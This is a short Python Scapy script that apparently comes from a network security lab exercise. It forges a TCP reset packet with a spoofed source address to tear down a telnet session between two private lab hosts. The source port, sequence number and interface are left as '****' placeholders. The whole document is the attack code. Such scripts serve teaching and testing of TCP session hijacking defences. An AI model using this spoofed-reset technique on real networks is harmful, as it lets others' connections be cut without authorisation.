#!/usr/bin/python3
import sys
from scapy.all import *

print("SENDING RESET PACKET.........")
IPLayer = IP(src="10.9.0.6", dst="10.9.0.5")
TCPLayer = TCP(sport=****, dport=23,flags="R", seq=****)
pkt = IPLayer/TCPLayer
ls(pkt)
send(pkt,iface = '****', verbose=0)

